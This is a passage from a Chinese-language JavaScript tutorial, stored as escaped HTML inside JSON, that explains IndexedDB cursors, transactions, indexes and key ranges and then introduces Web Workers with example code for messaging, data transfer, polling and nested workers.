language-javascript\"><code>objectStore.deleteIndex(indexName)</code></pre><p><strong>（13）IDBObjectStore.openCursor()</strong></p>\n<p><code>IDBObjectStore.openCursor()</code>用于获取一个指针对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>IDBObjectStore.openCursor()</code></pre><p>指针对象可以用来遍历数据。该对象也是异步的，有自己的<code>success</code>和<code>error</code>事件，可以对它们指定监听函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var t = db.transaction([&#039;test&#039;], &#039;readonly&#039;);\nvar store = t.objectStore(&#039;test&#039;);\n\nvar cursor = store.openCursor();\n\ncursor.onsuccess = function (event) {\n  var res = event.target.result;\n  if (res) {\n    console.log(&#039;Key&#039;, res.key);\n    console.dir(&#039;Data&#039;, res.value);\n    res.continue();\n  }\n}</code></pre><p>监听函数接受一个事件对象作为参数，该对象的<code>target.result</code>属性指向当前数据记录。该记录的<code>key</code>和<code>value</code>分别返回主键和键值（即实际存入的数据）。<code>continue()</code>方法将光标移到下一个数据对象，如果当前数据对象已经是最后一个数据了，则光标指向<code>null</code>。</p>\n<p><code>openCursor()</code>方法的第一个参数是主键值，或者一个 IDBKeyRange 对象。如果指定该参数，将只处理包含指定主键的记录；如果省略，将处理所有的记录。该方法还可以接受第二个参数，表示遍历方向，默认值为<code>next</code>，其他可能的值为<code>prev</code>、<code>nextunique</code>和<code>prevunique</code>。后两个值表示如果遇到重复值，会自动跳过。</p>\n<p><strong>（14）IDBObjectStore.openKeyCursor()</strong></p>\n<p><code>IDBObjectStore.openKeyCursor()</code>用于获取一个主键指针对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>IDBObjectStore.openKeyCursor()</code></pre>\n        <h2>\n            <a href='#IDBTransaction-对象' class='header-anchor'>#</a>\n            <span>IDBTransaction 对象</span>\n        </h2>\n    <p>IDBTransaction 对象用来异步操作数据库事务，所有的读写操作都要通过这个对象进行。</p>\n<p><code>IDBDatabase.transaction()</code>方法返回的就是一个 IDBTransaction 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var db;\nvar DBOpenRequest = window.indexedDB.open(&#039;demo&#039;, 1);\n\nDBOpenRequest.onsuccess = function(event) {\n  db = DBOpenRequest.result;\n  var transaction = db.transaction([&#039;demo&#039;], &#039;readwrite&#039;);\n\n  transaction.oncomplete = function (event) {\n    console.log(&#039;transaction success&#039;);  \n  };\n\n  transaction.onerror = function (event) {\n    console.log(&#039;tansaction error: &#039; + transaction.error);\n  };\n\n  var objectStore = transaction.objectStore(&#039;demo&#039;);\n  var objectStoreRequest = objectStore.add({ foo: 1 });\n\n  objectStoreRequest.onsuccess = function (event) {\n    console.log(&#039;add data success&#039;);\n  };\n\n};</code></pre><p>事务的执行顺序是按照创建的顺序，而不是发出请求的顺序。</p>\n<pre class=\"prettyprint language-javascript\"><code>var trans1 = db.transaction(&#039;foo&#039;, &#039;readwrite&#039;);\nvar trans2 = db.transaction(&#039;foo&#039;, &#039;readwrite&#039;);\nvar objectStore2 = trans2.objectStore(&#039;foo&#039;)\nvar objectStore1 = trans1.objectStore(&#039;foo&#039;)\nobjectStore2.put(&#039;2&#039;, &#039;key&#039;);\nobjectStore1.put(&#039;1&#039;, &#039;key&#039;);</code></pre><p>上面代码中，<code>key</code>对应的键值最终是<code>2</code>，而不是<code>1</code>。因为事务<code>trans1</code>先于<code>trans2</code>创建，所以首先执行。</p>\n<p>注意，事务有可能失败，只有监听到事务的<code>complete</code>事件，才能保证事务操作成功。</p>\n<p>IDBTransaction 对象有以下属性。</p>\n<ul>\n<li><code>IDBTransaction.db</code>：返回当前事务所在的数据库对象 IDBDatabase。</li>\n<li><code>IDBTransaction.error</code>：返回当前事务的错误。如果事务没有结束，或者事务成功结束，或者被手动终止，该方法返回<code>null</code>。</li>\n<li><code>IDBTransaction.mode</code>：返回当前事务的模式，默认是<code>readonly</code>（只读），另一个值是<code>readwrite</code>。</li>\n<li><code>IDBTransaction.objectStoreNames</code>：返回一个类似数组的对象 DOMStringList，成员是当前事务涉及的对象仓库的名字。</li>\n<li><code>IDBTransaction.onabort</code>：指定<code>abort</code>事件（事务中断）的监听函数。</li>\n<li><code>IDBTransaction.oncomplete</code>：指定<code>complete</code>事件（事务成功）的监听函数。</li>\n<li><code>IDBTransaction.onerror</code>：指定<code>error</code>事件（事务失败）的监听函数。</li>\n</ul>\n<p>IDBTransaction 对象有以下方法。</p>\n<ul>\n<li><code>IDBTransaction.abort()</code>：终止当前事务，回滚所有已经进行的变更。</li>\n<li><code>IDBTransaction.objectStore(name)</code>：返回指定名称的对象仓库 IDBObjectStore。</li>\n</ul>\n\n        <h2>\n            <a href='#IDBIndex-对象' class='header-anchor'>#</a>\n            <span>IDBIndex 对象</span>\n        </h2>\n    <p>IDBIndex 对象代表数据库的索引，通过这个对象可以获取数据库里面的记录。数据记录的主键默认就是带有索引，IDBIndex 对象主要用于通过除主键以外的其他键，建立索引获取对象。</p>\n<p>IDBIndex 是持久性的键值对存储。只要插入、更新或删除数据记录，引用的对象库中的记录，索引就会自动更新。</p>\n<p><code>IDBObjectStore.index()</code>方法可以获取 IDBIndex 对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var transaction = db.transaction([&#039;contactsList&#039;], &#039;readonly&#039;);\nvar objectStore = transaction.objectStore(&#039;contactsList&#039;);\nvar myIndex = objectStore.index(&#039;lName&#039;);\n\nmyIndex.openCursor().onsuccess = function (event) {\n  var cursor = event.target.result;\n  if (cursor) {\n    var tableRow = document.createElement(&#039;tr&#039;);\n    tableRow.innerHTML =   &#039;&lt;td&gt;&#039; + cursor.value.id + &#039;&lt;/td&gt;&#039;\n                         + &#039;&lt;td&gt;&#039; + cursor.value.lName + &#039;&lt;/td&gt;&#039;\n                         + &#039;&lt;td&gt;&#039; + cursor.value.fName + &#039;&lt;/td&gt;&#039;\n                         + &#039;&lt;td&gt;&#039; + cursor.value.jTitle + &#039;&lt;/td&gt;&#039;\n                         + &#039;&lt;td&gt;&#039; + cursor.value.company + &#039;&lt;/td&gt;&#039;\n                         + &#039;&lt;td&gt;&#039; + cursor.value.eMail + &#039;&lt;/td&gt;&#039;\n                         + &#039;&lt;td&gt;&#039; + cursor.value.phone + &#039;&lt;/td&gt;&#039;\n                         + &#039;&lt;td&gt;&#039; + cursor.value.age + &#039;&lt;/td&gt;&#039;;\n    tableEntry.appendChild(tableRow);\n\n    cursor.continue();\n  } else {\n    console.log(&#039;Entries all displayed.&#039;);\n  }\n};</code></pre><p>IDBIndex 对象有以下属性。</p>\n<ul>\n<li><code>IDBIndex.name</code>：字符串，索引的名称。</li>\n<li><code>IDBIndex.objectStore</code>：索引所在的对象仓库。</li>\n<li><code>IDBIndex.keyPath</code>：索引的主键。</li>\n<li><code>IDBIndex.multiEntry</code>：布尔值，针对<code>keyPath</code>为数组的情况，如果设为<code>true</code>，创建数组时，每个数组成员都会有一个条目，否则每个数组都只有一个条目。</li>\n<li><code>IDBIndex.unique</code>：布尔值，表示创建索引时是否允许相同的主键。</li>\n</ul>\n<p>IDBIndex 对象有以下方法，它们都是异步的，立即返回的都是一个 IDBRequest 对象。</p>\n<ul>\n<li><code>IDBIndex.count()</code>：用来获取记录的数量。它可以接受主键或 KeyRange 对象作为参数，这时只返回符合主键的记录数量，否则返回所有记录的数量。</li>\n<li><code>IDBIndex.get(key)</code>：用来获取符合指定主键的数据记录。</li>\n<li><code>IDBIndex.getKey(key)</code>：用来获取指定的主键。</li>\n<li><code>IDBIndex.getAll()</code>：用来获取所有的数据记录。它可以接受两个参数，都是可选的，第一个参数用来指定主键，第二个参数用来指定返回记录的数量。如果省略这两个参数，则返回所有记录。由于获取成功时，浏览器必须生成所有对象，所以对性能有影响。如果数据集比较大，建议使用 IDBCursor 对象。</li>\n<li><code>IDBIndex.getAllKeys()</code>：该方法与<code>IDBIndex.getAll()</code>方法相似，区别是获取所有主键。</li>\n<li><code>IDBIndex.openCursor()</code>：用来获取一个 IDBCursor 对象，用来遍历索引里面的所有条目。</li>\n<li><code>IDBIndex.openKeyCursor()</code>：该方法与<code>IDBIndex.openCursor()</code>方法相似，区别是遍历所有条目的主键。</li>\n</ul>\n\n        <h2>\n            <a href='#IDBCursor-对象' class='header-anchor'>#</a>\n            <span>IDBCursor 对象</span>\n        </h2>\n    <p>IDBCursor 对象代表指针对象，用来遍历数据仓库（IDBObjectStroe）或索引（IDBIndex）的记录。</p>\n<p>IDBCursor 对象一般通过<code>IDBObjectStore.openCursor()</code>方法获得。</p>\n<pre class=\"prettyprint language-javascript\"><code>var transaction = db.transaction([&#039;rushAlbumList&#039;], &#039;readonly&#039;);\nvar objectStore = transaction.objectStore(&#039;rushAlbumList&#039;);\n\nobjectStore.openCursor(null, &#039;next&#039;).onsuccess = function(event) {\n  var cursor = event.target.result;\n  if (cursor) {\n    var listItem = document.createElement(&#039;li&#039;);\n      listItem.innerHTML = cursor.value.albumTitle + &#039;, &#039; + cursor.value.year;\n      list.appendChild(listItem);\n\n      console.log(cursor.source);\n      cursor.continue();\n    } else {\n      console.log(&#039;Entries all displayed.&#039;);\n    }\n  };\n};</code></pre><p>IDBCursor 对象的属性。</p>\n<ul>\n<li><code>IDBCursor.source</code>：返回正在遍历的对象仓库或索引。</li>\n<li><code>IDBCursor.direction</code>：字符串，表示指针遍历的方向。共有四个可能的值：next（从头开始向后遍历）、nextunique（从头开始向后遍历，重复的值只遍历一次）、prev（从尾部开始向前遍历）、prevunique（从尾部开始向前遍历，重复的值只遍历一次）。该属性通过<code>IDBObjectStore.openCursor()</code>方法的第二个参数指定，一旦指定就不能改变了。</li>\n<li><code>IDBCursor.key</code>：返回当前记录的主键。</li>\n<li><code>IDBCursor.value</code>：返回当前记录的数据值。</li>\n<li>IDBCursor.primaryKey：返回当前记录的主键。对于数据仓库（objectStore）来说，这个属性等同于 IDBCursor.key；对于索引，IDBCursor.key 返回索引的位置值，该属性返回数据记录的主键。</li>\n</ul>\n<p>IDBCursor 对象有如下方法。</p>\n<ul>\n<li><code>IDBCursor.advance(n)</code>：指针向前移动 n 个位置。</li>\n<li><code>IDBCursor.continue()</code>：指针向前移动一个位置。它可以接受一个主键作为参数，这时会跳转到这个主键。</li>\n<li><code>IDBCursor.continuePrimaryKey()</code>：该方法需要两个参数，第一个是<code>key</code>，第二个是<code>primaryKey</code>，将指针移到符合这两个参数的位置。</li>\n<li><code>IDBCursor.delete()</code>：用来删除当前位置的记录，返回一个 IDBRequest 对象。该方法不会改变指针的位置。</li>\n<li><code>IDBCursor.update()</code>：用来更新当前位置的记录，返回一个 IDBRequest 对象。它的参数是要写入数据库的新的值。</li>\n</ul>\n\n        <h2>\n            <a href='#IDBKeyRange-对象' class='header-anchor'>#</a>\n            <span>IDBKeyRange 对象</span>\n        </h2>\n    <p>IDBKeyRange 对象代表数据仓库（object store）里面的一组主键。根据这组主键，可以获取数据仓库或主键里面的一组记录。</p>\n<p>IDBKeyRange 可以只包含一个值，也可以指定上限和下限。它有四个静态方法，用来指定主键的范围。</p>\n<ul>\n<li><code>IDBKeyRange.lowerBound()</code>：指定下限。</li>\n<li><code>IDBKeyRange.upperBound()</code>：指定上限。</li>\n<li><code>IDBKeyRange.bound()</code>：同时指定上下限。</li>\n<li><code>IDBKeyRange.only()</code>：指定只包含一个值。</li>\n</ul>\n<p>下面是一些代码实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>// All keys ≤ x\nvar r1 = IDBKeyRange.upperBound(x);\n\n// All keys &lt; x\nvar r2 = IDBKeyRange.upperBound(x, true);\n\n// All keys ≥ y\nvar r3 = IDBKeyRange.lowerBound(y);\n\n// All keys &gt; y\nvar r4 = IDBKeyRange.lowerBound(y, true);\n\n// All keys ≥ x &amp;&amp; ≤ y\nvar r5 = IDBKeyRange.bound(x, y);\n\n// All keys &gt; x &amp;&amp;&lt; y\nvar r6 = IDBKeyRange.bound(x, y, true, true);\n\n// All keys &gt; x &amp;&amp; ≤ y\nvar r7 = IDBKeyRange.bound(x, y, true, false);\n\n// All keys ≥ x &amp;&amp;&lt; y\nvar r8 = IDBKeyRange.bound(x, y, false, true);\n\n// The key = z    \nvar r9 = IDBKeyRange.only(z);</code></pre><p><code>IDBKeyRange.lowerBound()</code>、<code>IDBKeyRange.upperBound()</code>、<code>IDBKeyRange.bound()</code>这三个方法默认包括端点值，可以传入一个布尔值，修改这个属性。</p>\n<p>与之对应，IDBKeyRange 对象有四个只读属性。</p>\n<ul>\n<li><code>IDBKeyRange.lower</code>：返回下限</li>\n<li><code>IDBKeyRange.lowerOpen</code>：布尔值，表示下限是否为开区间（即下限是否排除在范围之外）</li>\n<li><code>IDBKeyRange.upper</code>：返回上限</li>\n<li><code>IDBKeyRange.upperOpen</code>：布尔值，表示上限是否为开区间（即上限是否排除在范围之外）</li>\n</ul>\n<p>IDBKeyRange 实例对象生成以后，将它作为参数输入 IDBObjectStore 或 IDBIndex 对象的<code>openCursor()</code>方法，就可以在所设定的范围内读取数据。</p>\n<pre class=\"prettyprint language-javascript\"><code>var t = db.transaction([&#039;people&#039;], &#039;readonly&#039;);\nvar store = t.objectStore(&#039;people&#039;);\nvar index = store.index(&#039;name&#039;);\n\nvar range = IDBKeyRange.bound(&#039;B&#039;, &#039;D&#039;);\n\nindex.openCursor(range).onsuccess = function (e) {\n  var cursor = e.target.result;\n  if (cursor) {\n    console.log(cursor.key + &#039;:&#039;);\n\n    for (var field in cursor.value) {\n      console.log(cursor.value[field]);\n    }\n    cursor.continue();\n  }\n}</code></pre><p>IDBKeyRange 有一个实例方法<code>includes(key)</code>，返回一个布尔值，表示某个主键是否包含在当前这个主键组之内。</p>\n<pre class=\"prettyprint language-javascript\"><code>var keyRangeValue = IDBKeyRange.bound(&#039;A&#039;, &#039;K&#039;, false, false);\n\nkeyRangeValue.includes(&#039;F&#039;) // true\nkeyRangeValue.includes(&#039;W&#039;) // false</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Raymond Camden, <a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/working-with-indexeddb/\">Working With IndexedDB – Part 1</a></li>\n<li>Raymond Camden, <a href=\"http://net.tutsplus.com/tutorials/javascript-ajax/working-with-indexeddb-part-2/\">Working With IndexedDB – Part 2</a></li>\n<li>Raymond Camden, <a href=\"https://code.tutsplus.com/tutorials/working-with-indexeddb-part-3--net-36220\">Working With IndexedDB - Part 3</a></li>\n<li>Tiffany Brown, <a href=\"http://dev.opera.com/articles/introduction-to-indexeddb/\">An Introduction to IndexedDB</a></li>\n<li>David Fahlander, <a href=\"https://hacks.mozilla.org/2014/06/breaking-the-borders-of-indexeddb/\">Breaking the Borders of IndexedDB</a></li>\n<li>TutorialsPoint, <a href=\"https://www.tutorialspoint.com/html5/html5_indexeddb.htm\">HTML5 - IndexedDB</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"Web Worker","link":"/bom/webworker.html"}],"content":"\n        <h1>\n            <a href='#Web-Worker' class='header-anchor'>#</a>\n            <span>Web Worker</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>JavaScript 语言采用的是单线程模型，也就是说，所有任务只能在一个线程上完成，一次只能做一件事。前面的任务没做完，后面的任务只能等着。随着电脑计算能力的增强，尤其是多核 CPU 的出现，单线程带来很大的不便，无法充分发挥计算机的计算能力。</p>\n<p>Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。在主线程运行的同时，Worker 线程在后台运行，两者互不干扰。等到 Worker 线程完成计算任务，再把结果返回给主线程。这样的好处是，一些计算密集型或高延迟的任务，被 Worker 线程负担了，主线程（通常负责 UI 交互）就会很流畅，不会被阻塞或拖慢。</p>\n<p>Worker 线程一旦新建成功，就会始终运行，不会被主线程上的活动（比如用户点击按钮、提交表单）打断。这样有利于随时响应主线程的通信。但是，这也造成了 Worker 比较耗费资源，不应该过度使用，而且一旦使用完毕，就应该关闭。</p>\n<p>Web Worker 有以下几个使用注意点。</p>\n<p>（1）<strong>同源限制</strong></p>\n<p>分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。</p>\n<p>（2）<strong>DOM 限制</strong></p>\n<p>Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用<code>document</code>、<code>window</code>、<code>parent</code>这些对象。但是，Worker 线程可以<code>navigator</code>对象和<code>location</code>对象。</p>\n<p>（3）<strong>通信联系</strong></p>\n<p>Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。</p>\n<p>（4）<strong>脚本限制</strong></p>\n<p>Worker 线程不能执行<code>alert()</code>方法和<code>confirm()</code>方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。</p>\n<p>（5）<strong>文件限制</strong></p>\n<p>Worker 线程无法读取本地文件，即不能打开本机的文件系统（<code>file://</code>），它所加载的脚本，必须来自网络。</p>\n\n        <h2>\n            <a href='#基本用法' class='header-anchor'>#</a>\n            <span>基本用法</span>\n        </h2>\n    \n        <h3>\n            <a href='#主线程' class='header-anchor'>#</a>\n            <span>主线程</span>\n        </h3>\n    <p>主线程采用<code>new</code>命令，调用<code>Worker()</code>构造函数，新建一个 Worker 线程。</p>\n<pre class=\"prettyprint language-javascript\"><code>var worker = new Worker(&#039;work.js&#039;);</code></pre><p><code>Worker()</code>构造函数的参数是一个脚本文件，该文件就是 Worker 线程所要执行的任务。由于 Worker 不能读取本地文件，所以这个脚本必须来自网络。如果下载没有成功（比如404错误），Worker 就会默默地失败。</p>\n<p>然后，主线程调用<code>worker.postMessage()</code>方法，向 Worker 发消息。</p>\n<pre class=\"prettyprint language-javascript\"><code>worker.postMessage(&#039;Hello World&#039;);\nworker.postMessage({method: &#039;echo&#039;, args: [&#039;Work&#039;]});</code></pre><p><code>worker.postMessage()</code>方法的参数，就是主线程传给 Worker 的数据。它可以是各种数据类型，包括二进制数据。</p>\n<p>接着，主线程通过<code>worker.onmessage</code>指定监听函数，接收子线程发回来的消息。</p>\n<pre class=\"prettyprint language-javascript\"><code>worker.onmessage = function (event) {\n  console.log(&#039;Received message &#039; + event.data);\n  doSomething();\n}\n\nfunction doSomething() {\n  // 执行任务\n  worker.postMessage(&#039;Work done!&#039;);\n}</code></pre><p>上面代码中，事件对象的<code>data</code>属性可以获取 Worker 发来的数据。</p>\n<p>Worker 完成任务以后，主线程就可以把它关掉。</p>\n<pre class=\"prettyprint language-javascript\"><code>worker.terminate();</code></pre>\n        <h3>\n            <a href='#Worker-线程' class='header-anchor'>#</a>\n            <span>Worker 线程</span>\n        </h3>\n    <p>Worker 线程内部需要有一个监听函数，监听<code>message</code>事件。</p>\n<pre class=\"prettyprint language-javascript\"><code>self.addEventListener(&#039;message&#039;, function (e) {\n  self.postMessage(&#039;You said: &#039; + e.data);\n}, false);</code></pre><p>上面代码中，<code>self</code>代表子线程自身，即子线程的全局对象。因此，等同于下面两种写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 写法一\nthis.addEventListener(&#039;message&#039;, function (e) {\n  this.postMessage(&#039;You said: &#039; + e.data);\n}, false);\n\n// 写法二\naddEventListener(&#039;message&#039;, function (e) {\n  postMessage(&#039;You said: &#039; + e.data);\n}, false);</code></pre><p>除了使用<code>self.addEventListener()</code>指定监听函数，也可以使用<code>self.onmessage</code>指定。监听函数的参数是一个事件对象，它的<code>data</code>属性包含主线程发来的数据。<code>self.postMessage()</code>方法用来向主线程发送消息。</p>\n<p>根据主线程发来的数据，Worker 线程可以调用不同的方法，下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>self.addEventListener(&#039;message&#039;, function (e) {\n  var data = e.data;\n  switch (data.cmd) {\n    case &#039;start&#039;:\n      self.postMessage(&#039;WORKER STARTED: &#039; + data.msg);\n      break;\n    case &#039;stop&#039;:\n      self.postMessage(&#039;WORKER STOPPED: &#039; + data.msg);\n      self.close(); // Terminates the worker.\n      break;\n    default:\n      self.postMessage(&#039;Unknown command: &#039; + data.msg);\n  };\n}, false);</code></pre><p>上面代码中，<code>self.close()</code>用于在 Worker 内部关闭自身。</p>\n\n        <h3>\n            <a href='#Worker-加载脚本' class='header-anchor'>#</a>\n            <span>Worker 加载脚本</span>\n        </h3>\n    <p>Worker 内部如果要加载其他脚本，有一个专门的方法<code>importScripts()</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>importScripts(&#039;script1.js&#039;);</code></pre><p>该方法可以同时加载多个脚本。</p>\n<pre class=\"prettyprint language-javascript\"><code>importScripts(&#039;script1.js&#039;, &#039;script2.js&#039;);</code></pre>\n        <h3>\n            <a href='#错误处理' class='header-anchor'>#</a>\n            <span>错误处理</span>\n        </h3>\n    <p>主线程可以监听 Worker 是否发生错误。如果发生错误，Worker 会触发主线程的<code>error</code>事件。</p>\n<pre class=\"prettyprint language-javascript\"><code>worker.onerror(function (event) {\n  console.log([\n    &#039;ERROR: Line &#039;, e.lineno, &#039; in &#039;, e.filename, &#039;: &#039;, e.message\n  ].join(&#039;&#039;));\n});\n\n// 或者\nworker.addEventListener(&#039;error&#039;, function (event) {\n  // ...\n});</code></pre><p>Worker 内部也可以监听<code>error</code>事件。</p>\n\n        <h3>\n            <a href='#关闭-Worker' class='header-anchor'>#</a>\n            <span>关闭 Worker</span>\n        </h3>\n    <p>使用完毕，为了节省系统资源，必须关闭 Worker。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 主线程\nworker.terminate();\n\n// Worker 线程\nself.close();</code></pre>\n        <h2>\n            <a href='#数据通信' class='header-anchor'>#</a>\n            <span>数据通信</span>\n        </h2>\n    <p>前面说过，主线程与 Worker 之间的通信内容，可以是文本，也可以是对象。需要注意的是，这种通信是拷贝关系，即是传值而不是传址，Worker 对通信内容的修改，不会影响到主线程。事实上，浏览器内部的运行机制是，先将通信内容串行化，然后把串行化后的字符串发给 Worker，后者再将它还原。</p>\n<p>主线程与 Worker 之间也可以交换二进制数据，比如 File、Blob、ArrayBuffer 等类型，也可以在线程之间发送。下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 主线程\nvar uInt8Array = new Uint8Array(new ArrayBuffer(10));\nfor (var i = 0; i &lt; uInt8Array.length; ++i) {\n  uInt8Array[i] = i * 2; // [0, 2, 4, 6, 8,...]\n}\nworker.postMessage(uInt8Array);\n\n// Worker 线程\nself.onmessage = function (e) {\n  var uInt8Array = e.data;\n  postMessage(&#039;Inside worker.js: uInt8Array.toString() = &#039; + uInt8Array.toString());\n  postMessage(&#039;Inside worker.js: uInt8Array.byteLength = &#039; + uInt8Array.byteLength);\n};</code></pre><p>但是，拷贝方式发送二进制数据，会造成性能问题。比如，主线程向 Worker 发送一个 500MB 文件，默认情况下浏览器会生成一个原文件的拷贝。为了解决这个问题，JavaScript 允许主线程把二进制数据直接转移给子线程，但是一旦转移，主线程就无法再使用这些二进制数据了，这是为了防止出现多个线程同时修改数据的麻烦局面。这种转移数据的方法，叫做<a href=\"http://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects\">Transferable Objects</a>。这使得主线程可以快速把数据交给 Worker，对于影像处理、声音处理、3D 运算等就非常方便了，不会产生性能负担。</p>\n<p>如果要直接转移数据的控制权，就要使用下面的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// Transferable Objects 格式\nworker.postMessage(arrayBuffer, [arrayBuffer]);\n\n// 例子\nvar ab = new ArrayBuffer(1);\nworker.postMessage(ab, [ab]);</code></pre>\n        <h2>\n            <a href='#同页面的-Web-Worker' class='header-anchor'>#</a>\n            <span>同页面的 Web Worker</span>\n        </h2>\n    <p>通常情况下，Worker 载入的是一个单独的 JavaScript 脚本文件，但是也可以载入与主线程在同一个网页的代码。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;!DOCTYPE html&gt;\n  &lt;body&gt;\n    &lt;script id=&quot;worker&quot; type=&quot;app/worker&quot;&gt;\n      addEventListener(&#039;message&#039;, function () {\n        postMessage(&#039;some message&#039;);\n      }, false);\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</code></pre><p>上面是一段嵌入网页的脚本，注意必须指定<code>&lt;script&gt;</code>标签的<code>type</code>属性是一个浏览器不认识的值，上例是<code>app/worker</code>。</p>\n<p>然后，读取这一段嵌入页面的脚本，用 Worker 来处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>var blob = new Blob([document.querySelector(&#039;#worker&#039;).textContent]);\nvar url = window.URL.createObjectURL(blob);\nvar worker = new Worker(url);\n\nworker.onmessage = function (e) {\n  // e.data === &#039;some message&#039;\n};</code></pre><p>上面代码中，先将嵌入网页的脚本代码，转成一个二进制对象，然后为这个二进制对象生成 URL，再让 Worker 加载这个 URL。这样就做到了，主线程和 Worker 的代码都在同一个网页上面。</p>\n\n        <h2>\n            <a href='#实例：Worker-线程完成轮询' class='header-anchor'>#</a>\n            <span>实例：Worker 线程完成轮询</span>\n        </h2>\n    <p>有时，浏览器需要轮询服务器状态，以便第一时间得知状态改变。这个工作可以放在 Worker 里面。</p>\n<pre class=\"prettyprint language-javascript\"><code>function createWorker(f) {\n  var blob = new Blob([&#039;(&#039; + f.toString() + &#039;)()&#039;]);\n  var url = window.URL.createObjectURL(blob);\n  var worker = new Worker(url);\n  return worker;\n}\n\nvar pollingWorker = createWorker(function (e) {\n  var cache;\n\n  function compare(new, old) { ... };\n\n  setInterval(function () {\n    fetch(&#039;/my-api-endpoint&#039;).then(function (res) {\n      var data = res.json();\n\n      if (!compare(data, cache)) {\n        cache = data;\n        self.postMessage(data);\n      }\n    })\n  }, 1000)\n});\n\npollingWorker.onmessage = function () {\n  // render data\n}\n\npollingWorker.postMessage(&#039;init&#039;);</code></pre><p>上面代码中，Worker 每秒钟轮询一次数据，然后跟缓存做比较。如果不一致，就说明服务端有了新的变化，因此就要通知主线程。</p>\n\n        <h2>\n            <a href='#实例：-Worker-新建-Worker' class='header-anchor'>#</a>\n            <span>实例： Worker 新建 Worker</span>\n        </h2>\n    <p>Worker 线程内部还能再新建 Worker 线程（目前只有 Firefox 浏览器支持）。下面的例子是将一个计算密集的任务，分配到10个 Worker。</p>\n<p>主线程代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var worker = new Worker(&#039;worker.js&#039;);\nworker.onmessage = function (event) {\n  document.getElementById(&#039;result&#039;).textContent = event.data;\n};</code></pre><p>Worker 线程代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>// worker.js\n\n// settings\nvar num_workers = 10;\nvar items_per_worker = 1000000;\n\n// start the workers\nvar result = 0;\nvar pending_workers = num_workers;\nfor (var i = 0; i &lt; num_workers; i += 1) {\n  var worker = new Worker(&#039;core.js&#039;);\n  worker.postMessage(i * items_per_worker);\n  worker.postMessage((i + 1) * items_per_worker);\n  worker.onmessage = storeResult;\n}\n\n// handle the results\nfunction storeResult(event) {\n  result += event.data;\n  pending_workers -= 1;\n  if (pending_workers &lt;= 0)\n    postMessage(result); // finished!\n}</code></pre><p>上面代码中，Worker 线程内部新建了10个 Worker 线程，并且依次向这10个 Worker 发送消息，告知了计算的起点和终点。计算任务脚本的代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>// core.js\nvar start;\nonmessage = getStart;\nfunction getStart(event) {\n  start = event.data;\n  onmessage = getEnd;\n}\n\nvar end;\nfunction getEnd(event) {\n  end = event.data;\n  onmessage = null;\n  work();\n}\n\nfunction work() {\n  var result = 0;\n  for (var i = start; i &lt; end; i += 1) {\n    // perform some complex calculation here\n    result += 1;\n  }\n  postMessage(result);\n  close();\n}</code></pre>\n        <h2>\n            <a href='#API' class='header-anchor'>#</a>\n            <span>API</span>\n        </h2>\n    \n        <h3>\n            <a href='#主线程' class='header-anchor'>#</a>\n            <span>主线程</span>\n        </h3>\n    <p>浏览器原生提供<code>Worker()</code>构造函数，用来供主线程生成 Worker 线程。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myWorker = new Worker(jsUrl, options);</code></pre><p><code>Worker()</code>构造函数，可以接受两个参数。第一个参数是脚本的网址（必须遵守同源政策），该参数是必需的，且只能加载 JS 脚本，否则会报错。第二个参数是配置对象，该对象可选。它的一个作用就是指定 Worker 的名称，用来区分多个 Worker 线程。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 主线程\nvar myWorker = new Worker(&#039;worker.js&#039;, { name : &#039;myWorker&#039; });\n\n// Worker 线程\nself.name // myWorker</code></pre><p><code>Worker()</code>构造函数返回一个 Worker 线程对象，用来供主线程操作 Worker。Worker 线程对象的属性和方法如下。</p>\n<ul>\n<li>Worker.onerror：指定 error 事件的监听函数。</li>\n<li>Worker.onmessage：指定 message 事件的监听函数，发送过来的数据在<code>Event.data</code>属性中。</li>\n<li>Worker.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>\n<li>Worker.postMessage()：向 Worker 线程发送消息。</li>\n<li>Worker.terminate()：立即终止 Worker 线程。</li>\n</ul>\n\n        <h3>\n            <a href='#Worker-线程' class='header-anchor'>#</a>\n            <span>Worker 线程</span>\n        </h3>\n    <p>Web Worker 有自己的全局对象，不是主线程的<code>window</code>，而是一个专门为 Worker 定制的全局对象。因此定义在<code>window</code>上面的对象和方法不是全部都可以使用。</p>\n<p>Worker 线程有一些自己的全局属性和方法。</p>\n<ul>\n<li>self.name： Worker 的名字。该属性只读，由构造函数指定。</li>\n<li>self.onmessage：指定<code>message</code>事件的监听函数。</li>\n<li>self.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>\n<li>self.close()：关闭 Worker 